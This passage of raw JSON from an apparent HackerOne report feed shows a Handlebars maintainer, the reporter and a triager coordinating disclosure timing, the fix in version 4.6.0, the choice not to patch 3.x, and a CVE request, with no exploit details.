class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and I\u0026#39;ll request disclosure which should only be actively disclosed after a reasonable time to allow users to upgrade indeed to fixed versions\u003c/li\u003e\n\u003cli\u003enpmjs as well as others like snyk track the H1 feed and get their updates through that, although by all means you are also welcome to directly contact them, however you should note not to make them re-triage and re-contact you for this issue because already have all the details here.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003esounds ok?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-11T11:54:01.173Z","updated_at":"2020-01-11T11:54:01.173Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6748581,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"So, this does mean that npm-security is getting the information automatically. That's fine.\nAnd you already requested disclosure? So the fact that there **is** a security-issue with 4.5.3 will be known in the next days?\n\nWhat I am still not sure about is:\n\n* Can I mention this now in my responses to Handlebars-users? The fact that the is an actual exploit known, but not yet published? So far, I have always spoken vaguely of potential threats, but this does not really justify a breaking change in a minor version bump.\n* Is there a concrete period of time that I must wait before publishing details? I couldn't find such a time-span in the document you mention above, and the links to the hacker-one documentation are all redirected to the start-page of the documentation https://docs.hackerone.com/","markdown_message":"\u003cp\u003eSo, this does mean that npm-security is getting the information automatically. That\u0026#39;s fine.\u003cbr\u003e\nAnd you already requested disclosure? So the fact that there \u003cstrong\u003eis\u003c/strong\u003e a security-issue with 4.5.3 will be known in the next days?\u003c/p\u003e\n\n\u003cp\u003eWhat I am still not sure about is:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eCan I mention this now in my responses to Handlebars-users? The fact that the is an actual exploit known, but not yet published? So far, I have always spoken vaguely of potential threats, but this does not really justify a breaking change in a minor version bump.\u003c/li\u003e\n\u003cli\u003eIs there a concrete period of time that I must wait before publishing details? I couldn\u0026#39;t find such a time-span in the document you mention above, and the links to the hacker-one documentation are all redirected to the start-page of the documentation \u003ca title=\"https://docs.hackerone.com/\" href=\"https://docs.hackerone.com/\"\u003ehttps://docs.hackerone.com/\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2020-01-12T16:25:47.609Z","updated_at":"2020-01-12T16:25:47.609Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6923854,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I haven't seen an entry for this issue on npmjs.com yet. @lirantal Are you sure it is already on the feed?","markdown_message":"\u003cp\u003eI haven\u0026#39;t seen an entry for this issue on npmjs.com yet. \u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e Are you sure it is already on the feed?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-30T21:01:35.390Z","updated_at":"2020-01-30T21:01:35.390Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6924203,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@knappi79 I think it will appear there, after that this report will be disclosed. Currently it's private.","markdown_message":"\u003cp\u003e\u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e I think it will appear there, after that this report will be disclosed. Currently it\u0026#39;s private.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-30T21:51:49.922Z","updated_at":"2020-01-30T21:51:49.922Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7124458,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@amac @lirantal can you give me a date, when this issue will be disclosed? The issue is fixed since version 4.6.0, which was released a month ago, isn't it about time to go public?","markdown_message":"\u003cp\u003e\u003ca href=\"/amac\"\u003e@amac\u003c/a\u003e \u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e can you give me a date, when this issue will be disclosed? The issue is fixed since version 4.6.0, which was released a month ago, isn\u0026#39;t it about time to go public?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-22T22:08:56.321Z","updated_at":"2020-02-22T22:08:56.321Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7124479,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Or, I wonder if we need to patch the legacy version 3.x as well. There certainly are people using it... I'll check first.","markdown_message":"\u003cp\u003eOr, I wonder if we need to patch the legacy version 3.x as well. There certainly are people using it... I\u0026#39;ll check first.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-22T22:18:28.323Z","updated_at":"2020-02-22T22:18:28.323Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7300963,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@knappi79 Have you patched the version 3.x? Could we disclosure the report finally? ","markdown_message":"\u003cp\u003e\u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e Have you patched the version 3.x? Could we disclosure the report finally? \u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-12T15:00:21.980Z","updated_at":"2020-03-12T15:00:21.980Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7303385,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@alexandermac05 I think I will *not* patch the 3.x branch. The fix for 4.x has caused a lot of trouble for people who were not even affected by the issue. And there is no good way to solve this problem in a backwards compatible way. I think a blacklist of properties won't solve the problem and a whitelist will be too restrictive.\n\nPeople will just have to go upgrade.\n\nBut I have posted this question into our internal discussion group. Can we disclose this leak on Monday if I haven't heard back? The weekend should be free for the devs who have to upgrade their software to 4.x.","markdown_message":"\u003cp\u003e\u003ca href=\"/alexandermac05\"\u003e@alexandermac05\u003c/a\u003e I think I will \u003cem\u003enot\u003c/em\u003e patch the 3.x branch. The fix for 4.x has caused a lot of trouble for people who were not even affected by the issue. And there is no good way to solve this problem in a backwards compatible way. I think a blacklist of properties won\u0026#39;t solve the problem and a whitelist will be too restrictive.\u003c/p\u003e\n\n\u003cp\u003ePeople will just have to go upgrade.\u003c/p\u003e\n\n\u003cp\u003eBut I have posted this question into our internal discussion group. Can we disclose this leak on Monday if I haven\u0026#39;t heard back? The weekend should be free for the devs who have to upgrade their software to 4.x.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-12T20:06:53.152Z","updated_at":"2020-03-12T20:07:39.033Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7547049,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"From my point-of-view, this issue can be published. Can anybody attempt to do that on Monday? I would like to fill https://github.com/wycats/handlebars.js/issues/1631 with some contents.","markdown_message":"\u003cp\u003eFrom my point-of-view, this issue can be published. Can anybody attempt to do that on Monday? I would like to fill \u003ca title=\"https://github.com/wycats/handlebars.js/issues/1631\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fwycats%2Fhandlebars.js%2Fissues%2F1631\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/wycats/handlebars.js/issues/1631\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e with some contents.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-05T10:24:35.511Z","updated_at":"2020-04-05T10:24:35.511Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7557793,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@lirantal could you disclosure the report please?","markdown_message":"\u003cp\u003e\u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e could you disclosure the report please?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-06T12:26:43.174Z","updated_at":"2020-04-06T12:26:43.174Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7793923,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@knappi79 @macasun you both deserve a huge apology as I have dropped the ball on this for a couple of months. Thank you both for following through on it and the work that has been put into fixing and verifying it.\n\nI'll disclose the security report here on Monday (work day) to not disturb anyone on weekends and will follow-up with requesting a CVE as well. ","markdown_message":"\u003cp\u003e\u003ca href=\"/knappi79\"\u003e@knappi79\u003c/a\u003e \u003ca href=\"/macasun\"\u003e@macasun\u003c/a\u003e you both deserve a huge apology as I have dropped the ball on this for a couple of months. Thank you both for following through on it and the work that has been put into fixing and verifying it.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll disclose the security report here on Monday (work day) to not disturb anyone on weekends and will follow-up with requesting a CVE as well. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-25T19:12:38.194Z","updated_at":"2020-04-25T19:12:38.194Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7815414,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-27T22:08:42.348Z","updated_at":"2020-04-27T22:08:42.348Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"macasun","url":"/macasun"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7815419,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-27T22:08:54.372Z","updated_at":"2020-04-27T22:08:54.372Z","first_to_agree":true,"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7815466,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks and no problem. We are all busy elsewhere...","markdown_message":"\u003cp\u003eThanks and no problem. We are all busy elsewhere...\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-27T22:12:02.761Z","updated_at":"2020-04-27T22:12:02.761Z","actor":{"username":"knappi79","cleared":false,"url":"/knappi79","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7815473,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-27T22:13:11.342Z","updated_at":"2020-04-27T22:13:11.342Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}